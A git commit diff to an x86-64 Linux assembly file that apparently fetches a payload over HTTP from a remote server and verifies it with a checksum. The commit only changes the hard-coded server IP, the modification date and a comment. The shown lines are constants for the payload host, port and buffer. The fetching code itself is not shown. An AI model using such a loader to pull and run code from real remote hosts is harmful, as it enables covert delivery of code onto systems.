aebe1c170a3ef7a62eacfbe48f14de740b64c527
Pithase <156387941+Pithase@users.noreply.github.com>
2025-05-06 12:20:42 -0300

    Update payload-read-http-file-size-dynamic-checksum.asm
    Cambio de dirección IP del servidor

--- payload-read-http-file-size-dynamic-checksum.asm
+++ payload-read-http-file-size-dynamic-checksum.asm
@@ -1,7 +1,7 @@
 ;===============================================================================================================================================================
 ; Archivo      : payload-read-http-file-size-dynamic-checksum.asm
 ; Creado       : 15/02/2025
-; Modificado   : 21/02/2025
+; Modificado   : 06/05/2025
 ; Autor        : Gastón M. González
 ; Plataforma   : Linux
 ; Arquitectura : x86-64
@@ -39,7 +39,7 @@
 ;        db "Host: pithase.com.ar", 0x0D, 0x0A
 ; por -> db "Host: localhost", 0x0D, 0x0A
 ;
-;        server_ip    equ 0xB6783AC8   ; IP [200.58.120.182] del servidor en little endian
+;        server_ip    equ 0x91431952   ; IP [82.25.67.145] del servidor en little endian
 ; por -> server_ip    equ 0x0100007F   ; IP [127.0.0.1] en little endian
 ;
 ;        http_port    equ 0x5000       ; puerto 80 en little endian
@@ -66,7 +66,7 @@ section .rodata
              db 0x0D, 0x0A, 0
     http_get_len equ $ - http_get
 
-    server_ip    equ 0xB6783AC8    ; IP [200.58.120.182] del servidor en little endian
+    server_ip    equ 0x91431952    ; IP [82.25.67.145] del servidor en little endian
     http_port    equ 0x5000        ; puerto 80 en little endian
     buffer_size  equ 16384         ; tamaño predefinido del buffer (HTTP headers + payload)
 
